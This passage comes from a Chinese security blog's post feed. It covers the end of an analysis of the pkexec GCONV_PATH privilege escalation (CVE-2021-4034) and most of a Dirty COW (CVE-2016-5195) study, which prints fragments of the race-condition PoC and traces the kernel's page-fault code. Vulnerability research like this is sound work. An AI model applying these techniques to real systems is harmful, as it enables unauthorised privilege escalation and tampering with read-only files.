alt="image-20220213225301733"></p><p><code>linux</code>的动态链接器会在特权程序执行的时候清楚危险的环境变量，因此使用<code>execve</code>启动<code>pkexec</code>时，即使设置了<code>GCONV_PATH</code>也会被连接器清除。如下图所示<code>test4</code>具有<code>suid</code>权限，在<code>test5</code>中使用<code>execve</code>启动<code>test4</code>，并且设置了<code>GCONV_PATH</code>环境变量，但是可以看到<code>test4</code>的环境变量中并没有<code>GCONV_PATH</code></p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220213230436902.png" alt="image-20220213230436902"></p><p>因此需要使用<code>pkexec</code>中存在的数组越界漏洞，将<code>GCONV_PATH</code>写入</p><p>变量<code>argv</code>与变量<code>envp</code>在内存中是连续的，如下图所示，图片来自于<a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034">PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034)</a></p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220213231117906.png" alt="image-20220213231117906"></p><p>当我们使用<code>execve</code>启动<code>pkexec</code>时，<code>argv</code>是<code>NULL</code>，因此<code>argc</code>的值为0，但是<code>pkexec</code>会默认将<code>argc</code>的值赋值为1，因此<code>argv[argc] = argv[1] = envp[0]</code>，因此<code>envp</code>中的值会被越界读取。</p><p><strong>利用数组越界写入GCONV_PATH&#x3D;.</strong></p><p>使用<code>execve</code>启动<code>pkexec</code>时<code>envp[0]</code>的值为<code>FileName:.</code>，并在当前目录下新建名为<code>GCONV_PATH=.</code>的文件夹，该文件夹下新建名为<code>FileName:.</code>的文件。</p><p>首先<code>pkexec</code>会取出<code>argv[1]</code>(即<code>envp[0]</code>)的值，接着通过<code>g_find_program_in_path</code>函数获取文件路径从而构造出<code>GCONV_PATH=.FileName:.</code>，接着该值会重新覆盖<code>envp[0]</code>，至此<code>GCONV_PATH</code>被成功写入。</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220214102739373.png" alt="image-20220214102739373"></p><p><strong>GDB调试</strong></p><p>数组越界读</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220214104935827.png" alt="image-20220214104935827"></p><p>环境变量构造</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220214105223212.png" alt="image-20220214105223212"></p><p>成功引入环境变量</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220214105739569.png" alt="image-20220214105739569"></p><p>最后就是使得<code>pkexec</code>使用<code>g_printerr</code>打印错误信息即可。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034">https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034</a></p><p><a href="https://bbs.pediy.com/thread-271423.htm">https://bbs.pediy.com/thread-271423.htm</a></p><p><a href="https://github.com/berdav/CVE-2021-4034">https://github.com/berdav/CVE-2021-4034</a></p><p><a href="https://man7.org/linux/man-pages/man1/iconv.1.html">https://man7.org/linux/man-pages/man1/iconv.1.html</a></p><p><a href="https://xz.aliyun.com/t/10870#toc-0">https://xz.aliyun.com/t/10870#toc-0</a></p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE-2021-4034</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2016-5195-Dirtycow</title>
    <link href="/2023/06/27/CVE-2016-5195-DirtyCow/"/>
    <url>/2023/06/27/CVE-2016-5195-DirtyCow/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一直想学习Linux内核的相关知识却没有动身，偶然间在看雪发现了一篇复现脏牛的帖子<a href="https://bbs.pediy.com/thread-266033.htm">linux內核提权漏洞CVE-2016-5195</a>，写的非常详细，并且一直听说过脏牛提权的漏洞，借此机会跟着复现并且好好深入学习一下内核相关知识，恶补一下我这不扎实的基础，由于此前没怎么接触过内核相关知识及代码，因此做一个详细的笔记，方便以后查阅。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>环境采用qemu+busybox+linux-4.4.1主要参考两篇文章<a href="https://yuanbaoder.gitee.io/posts/2432.html#more">搭建Linux kernel调试环境</a>以及<a href="https://www.v4ler1an.com/2020/12/qemu/">QEMU + Busybox 模拟 Linux 内核环境</a></p><p>这两篇文章关于如何搭建环境已经解释的很详细了，我这里就不在阐述。</p><p>主要是记录一下搭建环境时候遇到的问题</p><ul><li>想要执行DirtyCow的exp，编译busybox后，需要挂载相应的文件系统，否则exp会执行不了，这里可以用一下ctf kernel题目的文件系统。</li><li>使用qemu启动时可以选择把cpu的个数设置为1，方便调试，否则会调试到一半跳转到其他进程<code>-smp cores=1,threads=1</code></li><li>关于linux内核编译时的优化，由于编译时的优化使得调试时不太方便，代码也会跳来跳去，因此需要将优化给关闭，但是直接修改Makefile文件将-O2修改为-O0，编译时会报错，因为内核的部分代码依赖于编译器的优化，这里找到了解决办法<a href="https://lists.kernelnewbies.org/pipermail/kernelnewbies/2016-March/015985.html">Is it possible to turn off the gcc optimization when compiling kernel?</a>，我们可以找到需要调试的模块，并修改该模块下的<code>Makefile</code>，例如将内核中read_write函数的优化关闭，可以在Makefile文件下添加<code>CFLAGS_read_write.o = -O0</code>，再编译即可或在函数前加<code>__attribute__((optimize(&quot;O0&quot;)))</code></li></ul><h1 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h1><ul><li><code>ubuntu 16.04</code></li><li><code>Linux-4.4.1</code></li><li><code>qemu-system-x86_64 2.5.0</code></li></ul><h1 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h1><p>文件<code>foo</code>是<code>root</code>权限的只读文件，但是利用脏牛漏洞，可以将数据<code>1111</code>写入到只读文件中</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20230101163821643.png" alt="image-20230101163821643"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>以<code>poc</code>作为切入点，分析漏洞成因</p><p>首先<code>poc</code>定义了两个线程以及这两个线程需要执行的操作，其中一个线程操作如<code>madviseThread</code>，不断执行<code>madvise</code>函数，该函数的参数<code>MADV_DONTNEED</code>旨在通知内核，<code>map</code>指定的地址内存短时间内不再访问，因此该线程做的具体操作就是不断的丢弃<code>map</code>地址指向的内存页。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">madviseThread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>  <span class="hljs-type">char</span> *str;<br>  str=(<span class="hljs-type">char</span>*)arg;<br>  <span class="hljs-type">int</span> i,c=<span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">100000000</span>;i++)<br>  &#123;<br>    c+=madvise(<span class="hljs-built_in">map</span>,<span class="hljs-number">100</span>,MADV_DONTNEED);<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;madvise %d\n\n&quot;</span>,c);<br>&#125;<br></code></pre></td></tr></table></figure><p>另一个线程的操作是<code>procselfmemThread</code>，该函数会访问内存空间，并找到<code>map</code>地址指向的内存，并且不断地写入数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">procselfmemThread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>  <span class="hljs-type">char</span> *str;<br>  str=(<span class="hljs-type">char</span>*)arg;<br><br>  <span class="hljs-type">int</span> f=open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>,O_RDWR);<br>  <span class="hljs-type">int</span> i,c=<span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">100000000</span>;i++) &#123;<br>    lseek(f,(<span class="hljs-type">uintptr_t</span>) <span class="hljs-built_in">map</span>,SEEK_SET);<br>    c+=write(f,str,<span class="hljs-built_in">strlen</span>(str));<br>  &#125;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;procselfmem %d\n\n&quot;</span>, c);<br>&#125;<br></code></pre></td></tr></table></figure><p>最后就是<code>poc</code>需要指定一个需要写入的只读文件，<code>poc</code>首先以只读权限打开目标文件，接着利用<code>mmap</code>函数将文件映射到进程空间中去，接着结合上述两个线程的操作，一个线程不断丢弃<code>map</code>指向的内存页，而另一个线程则不断地向<code>map</code>地址指向地内存页写入输入，那么在某一时刻发生了条件竞争则会导致往只读文件写入恶意数据。完成对只读文件写入的操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">...<br>  f=open(argv[<span class="hljs-number">1</span>],O_RDONLY);<br>  fstat(f,&amp;st);<br>  name=argv[<span class="hljs-number">1</span>];<br>  <span class="hljs-built_in">map</span>=mmap(<span class="hljs-literal">NULL</span>,st.st_size,PROT_READ,MAP_PRIVATE,f,<span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;mmap %zx\n\n&quot;</span>,(<span class="hljs-type">uintptr_t</span>) <span class="hljs-built_in">map</span>);<br>...<br></code></pre></td></tr></table></figure><p>在使用<code>mmap</code>函数将文件映射到内存的时，并没有完成虚拟地址向物理地址映射的过程，当对该地址进行写入操作时会触发缺页异常。整个缺页处理的流程是通过内核函数<code>follow_page_mask</code>与<code>faultin_page</code>函数处理完成的，具体流程如下</p><p>（1）第一次进入<code>follow_page_mask</code>，由于没有建立物理页，因此会直接通过<code>no_page_table</code>函数返回</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20230101165753546.png" alt="image-20230101165753546"></p><p>（2）由于没有找到对应的页表，则进入缺页错误处理函数中，进行物理页的建立</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20230101170006311.png" alt="image-20230101170006311"></p><p>（3）进入<code>faultin_page</code>函数进行缺页处理，由于需要对该内存页进行写操作（<code>procselfmemThread</code>线程执行的操作）,因此需要将<code>FAULT_FLAG_WRITE</code>标志位标记上，因为进程在映射文件的时候是只读映射，但是需要对这块内存进行写入操作，因此内核会用<code>FAULT_FLAG_WRITE</code>进行标记，这个标志位就是导致漏洞发生的关键点。</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20230101170224478.png" alt="image-20230101170224478"></p><p>（3）接着会进入<code>handle_mm_fault</code>函数，这个函数就会内存对应的物理页生成好，返回给用户进行写入操作。</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20230101170539003.png" alt="image-20230101170539003"></p><p>（4）这里介绍一下在<code>handle_mm_falut</code>函数内部会遇到三个函数的选择，分别是<code>do_read_fault</code>、<code>do_cow_fault</code>以及 <code>do_shared_fault</code>函数，由于<code>poc</code>使用<code>mmap</code>映射文件到内存的时候并有没有选择共享模式进行映射，因此不会进入<code>do_shared_fault</code>函数内部的流程，那么<code>do_read_fault</code>与<code>do_cow_fault</code>函数会怎么选择呢？这里涉及写时复制的操作，若进程对该内存只有读操作，那么内核会直接将内存对应的物理页返回给进程进行读操作，而进程对该内存需要进行写操作时候，由于不能影响原先物理内存的信息，此时内核会选择将该内存对应的物理页进行拷贝操作得到一个物理页的副本，将这个副本交给进程，那么进程就可以随意改写并且不会影响原始物理页的信息。那么如何判断进程是否有写的意图，从代码上可以看到，取决于<code>FAULT_FLAG_WRITE</code>这个标志位。</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20230101171200414.png" alt="image-20230101171200414"></p><p>（5）那么继续回到<code>handle_mm_fault</code>函数，这个函数就是经过一系列操作返回一个供进程写的物理页，但是返回的物理页不具有写的权限，因此会直接返回0。</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20230101172732897.png" alt="image-20230101172732897"></p><p>（6）则会第二次进入<code>follow_page_mask</code>函数，由于进程需要内存也也进行写操作，但是返回的内存页不能写，那么需要再一次进入<code>faultin_page</code>函数进行处理</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20230101173158606.png" alt="image-20230101173158606"></p><p>（7）第二次<code>faultin_page</code>函数后，<code>handle_mm_fault</code>函数则会返回一个可写的物理页</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20230101173443506.png" alt="image-20230101173443506"></p><p>（8）由于已经返回了可写的物理页，那么<code>FOLL_WRITE</code>标志位就可以清空了，这里是漏洞利用条件竞争想发生的时间点</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20230101173521394.png" alt="image-20230101173521394"></p><p>（9）第三次进入<code>follow_page_mask</code>函数，可以发现此时终于获得了物理页地址</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20230101173811280.png" alt="image-20230101173811280"></p><p>这里总结一些缺页流程，需要经过三次<code>follow_page_mask</code>函数以及两次<code>faultin_page</code>函数</p><ul><li><p><strong>第一次</strong><code>follow_page_mask</code>由于没有找到内存对应的物理页因此无法获取，则需要进入<code>faultin_page</code>函数进行缺页处理</p></li><li><p><strong>第一次</strong><code>faultin_page</code>函数建立了内存页对应的物理页，但是该物理页不具有可写权限。</p></li><li><p><strong>第二次</strong><code>follow_page_mask</code>，由于物理页不可写，直接返回。</p></li><li><p><strong>第二次</strong><code>faultin_page</code>，返回可写的物理页，将<code>FOLL_WRITE</code>标志位清除</p></li><li><p><strong>第三次</strong><code>follow_page_mask</code>，获得了可写的物理页，继续进行后续操作。</p></li></ul><p><strong>漏洞点</strong></p><p>在进行<strong>第二次</strong><code>faultin_page</code>时，<code>FOLL_WRITE</code>标志位被清除，<code>madviseThread</code>线程操作刚好执行，那么会将建立好的映射清空，那么流程进入到<code>follow_page_mask</code>会发现没法获取对应的物理页，则会继续进入<code>faultin_page</code>函数进行缺页处理，但是此时已经没有<code>FOLL_WRITE</code>标志位了，那么内核就会认为进程不会对该内存空间进行写操作，那么就会进入<code>do_read_fault</code>函数的流程，会将只读文件对应的物理页直接返回，那么后续的改写操作都会在这个物理页进行操作，从而导致只读文件被改写。</p><h1 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h1><ul><li><code>sys_write</code>函数本质是调用了内核的<code>SYSCALL_DEFINE3(write,unsigned int,fd,const char __user *,buf,size_t,count)</code></li></ul><p><strong>linux-4.4.1&#x2F;include&#x2F;linux&#x2F;syscalls.h:182</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_FTRACE_SYSCALLS</span><br>...<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_METADATA(sname, nb, ...)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_DEFINE0(sname)\ <span class="hljs-comment">//没有参数的系统调用</span></span><br>SYSCALL_METADATA(_#<span class="hljs-meta">#sname, 0);\</span><br><span class="hljs-meta">asmlinkage long sys_##sname(void)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_DEFINE1(name, ...) SYSCALL_DEFINEx(1, _##name, __VA_ARGS__) <span class="hljs-comment">//一个参数的系统调用</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_DEFINE2(name, ...) SYSCALL_DEFINEx(2, _##name, __VA_ARGS__) <span class="hljs-comment">//两个参数的系统调用</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_DEFINE3(name, ...) SYSCALL_DEFINEx(3, _##name, __VA_ARGS__) <span class="hljs-comment">//三个参数的系统调用</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_DEFINE4(name, ...) SYSCALL_DEFINEx(4, _##name, __VA_ARGS__) <span class="hljs-comment">//四个参数的系统调用</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_DEFINE5(name, ...) SYSCALL_DEFINEx(5, _##name, __VA_ARGS__) <span class="hljs-comment">//五个参数的系统调用</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_DEFINE6(name, ...) SYSCALL_DEFINEx(6, _##name, __VA_ARGS__) <span class="hljs-comment">//六个参数的系统调用</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SYSCALL_DEFINEx(x, sname, ...)\</span><br><span class="hljs-meta">SYSCALL_METADATA(sname, x, __VA_ARGS__)\ <span class="hljs-comment">//当没有定义CONFIG_FTRACE_SYSCALLS时，SYSCALL_METADATA(sname, x, __VA_ARGS__)的宏定义为空值</span></span><br>__SYSCALL_DEFINEx(x, sname, __VA_ARGS__)  <span class="hljs-comment">//将...以__VA_ARGS__替换</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __PROTECT(...) asmlinkage_protect(__VA_ARGS__) <span class="hljs-comment">// asmlinkage_protect(__VA_ARGS__)的宏定义为 do&#123; &#125;while(0)</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __SYSCALL_DEFINEx(x, name, ...)\</span><br><span class="hljs-meta">asmlinkage long sys##name(__MAP(x,__SC_DECL,__VA_ARGS__))\</span><br><span class="hljs-meta">__attribute__((alias(__stringify(SyS##name))));\ <span class="hljs-comment">//设置别名,sys_write等同于SyS_write</span></span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">long</span> SYSC#<span class="hljs-meta">#name(__MAP(x,__SC_DECL,__VA_ARGS__));\ <span class="hljs-comment">//_MAP()则是将参数拼接起来</span></span><br>asmlinkage <span class="hljs-type">long</span> SyS#<span class="hljs-meta">#name(__MAP(x,__SC_LONG,__VA_ARGS__));\</span><br><span class="hljs-meta">asmlinkage long SyS##name(__MAP(x,__SC_LONG,__VA_ARGS__))\ <span class="hljs-comment">//Sys_write内部调用了SYSC_write</span></span><br>&#123;\<br><span class="hljs-type">long</span> ret = SYSC#<span class="hljs-meta">#name(__MAP(x,__SC_CAST,__VA_ARGS__));\</span><br><span class="hljs-meta">__MAP(x,__SC_TEST,__VA_ARGS__);\</span><br><span class="hljs-meta">__PROTECT(x, ret,__MAP(x,__SC_ARGS,__VA_ARGS__));\</span><br><span class="hljs-meta">return ret;\</span><br><span class="hljs-meta">&#125;\</span><br><span class="hljs-meta">static inline long SYSC##name(__MAP(x,__SC_DECL,__VA_ARGS__))</span><br></code></pre></td></tr></table></figure><p><strong>linux-4.4.1&#x2F;include&#x2F;linux&#x2F;syscalls.h:92</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> __MAP0(m,...)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __MAP1(m,t,a) m(t,a)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __MAP2(m,t,a,...) m(t,a), __MAP1(m,__VA_ARGS__)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __MAP3(m,t,a,...) m(t,a), __MAP2(m,__VA_ARGS__)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __MAP4(m,t,a,...) m(t,a), __MAP3(m,__VA_ARGS__)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __MAP5(m,t,a,...) m(t,a), __MAP4(m,__VA_ARGS__)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __MAP6(m,t,a,...) m(t,a), __MAP5(m,__VA_ARGS__)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __MAP(n,...) __MAP##n(__VA_ARGS__) <span class="hljs-comment">//n代表参数的个数</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __SC_DECL(t, a)t a <span class="hljs-comment">//将两个参数直接拼接起来，即t为类型，a为变量名，例如__SE_DECL(int,x) = int x</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __TYPE_IS_L(t)(__same_type((t)0, 0L))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __TYPE_IS_UL(t)(__same_type((t)0, 0UL))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __TYPE_IS_LL(t) (__same_type((t)0, 0LL) || __same_type((t)0, 0ULL))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __SC_LONG(t, a) __typeof(__builtin_choose_expr(__TYPE_IS_LL(t), 0LL, 0L)) a</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __SC_CAST(t, a)(t) a</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __SC_ARGS(t, a)a</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __SC_TEST(t, a) (void)BUILD_BUG_ON_ZERO(!__TYPE_IS_LL(t) &amp;&amp; sizeof(t) &gt; sizeof(long))</span><br></code></pre></td></tr></table></figure><p><strong>linux-4.4.1&#x2F;include&#x2F;linux&#x2F;stringify.h</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __LINUX_STRINGIFY_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __LINUX_STRINGIFY_H</span><br><br><span class="hljs-comment">/* Indirect stringification.  Doing two levels allows the parameter to be a</span><br><span class="hljs-comment"> * macro itself.  For example, compile with -DFOO=bar, __stringify(FOO)</span><br><span class="hljs-comment"> * converts to &quot;bar&quot;.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __stringify_1(x...)#x</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __stringify(x...)__stringify_1(x) <span class="hljs-comment">//__stringify(a) = &quot;a&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span><span class="hljs-comment">/* !__LINUX_STRINGIFY_H */</span></span><br><br></code></pre></td></tr></table></figure><p><strong>linux-4.4.1&#x2F;include&#x2F;linux&#x2F;linkage.h</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __ASSEMBLY__</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> asmlinkage_protect</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> asmlinkage_protect(n, ret, args...)do &#123; &#125; while (0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>根据上述内核代码，<code>SYSCALL_DEFINE3(write,unsigned int,fd,const char __user *,buf,size_t,count)</code>的宏替换过程为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE3(write,<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>,fd,<span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *,buf,<span class="hljs-type">size_t</span>,count)<br>--&gt;<br>SYSCALL_DEFINEx(<span class="hljs-number">3</span>, _write, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>,fd,<span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *,buf,<span class="hljs-type">size_t</span>,count)<br>--&gt;<br>asmlinkage <span class="hljs-type">long</span> <span class="hljs-title function_">sys_write</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> char__user *buf,<span class="hljs-type">size_t</span> count)</span><br>__<span class="hljs-title function_">attribute__</span><span class="hljs-params">((alias(<span class="hljs-string">&quot;SyS_write&quot;</span>)))</span>; <span class="hljs-comment">//sys_write设置别名为SyS_write</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">long</span> <span class="hljs-title function_">SYSC_write</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> char__user *buf,<span class="hljs-type">size_t</span> count)</span>;<br>asmlinkage <span class="hljs-type">long</span> <span class="hljs-title function_">SyS_write</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> char__user *buf,<span class="hljs-type">size_t</span> count)</span>;<br>asmlinkage <span class="hljs-type">long</span> <span class="hljs-title function_">SyS_write</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> char__user *buf,<span class="hljs-type">size_t</span> count)</span>\ <br>&#123;\<br><span class="hljs-type">long</span> ret = SYSC_write(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> char__user *buf,<span class="hljs-type">size_t</span> count);\<br>(<span class="hljs-type">void</span>)BUILD_BUG_ON_ZERO(!__TYPE_IS_LL(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>) &amp;&amp; <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>) &gt; <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>)),(<span class="hljs-type">void</span>)BUILD_BUG_ON_ZERO(!__TYPE_IS_LL(<span class="hljs-type">const</span> char__user *) &amp;&amp; <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">const</span> char__user *) &gt; <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>))<br>    (<span class="hljs-type">void</span>)BUILD_BUG_ON_ZERO(!__TYPE_IS_LL(<span class="hljs-type">size_t</span>) &amp;&amp; <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>) &gt; <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>));\<br><span class="hljs-keyword">do</span> &#123; &#125; <span class="hljs-keyword">while</span> (<span class="hljs-number">0</span>);\<br><span class="hljs-keyword">return</span> ret;\<br>&#125;\<br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">long</span> <span class="hljs-title function_">SYSC_write</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> char__user *buf,<span class="hljs-type">size_t</span> count)</span><br></code></pre></td></tr></table></figure><p>因此<code>SYSCALL_DEFINE3(write,unsigned int,fd,const char __user *,buf,size_t,count)</code>编译后的结果是<code>sys_write(uunsigned int fd,const char __user * buf,size_t count)</code></p><h2 id="sys-write函数调用流程"><a href="#sys-write函数调用流程" class="headerlink" title="sys_write函数调用流程"></a><strong>sys_write函数调用流程</strong></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span 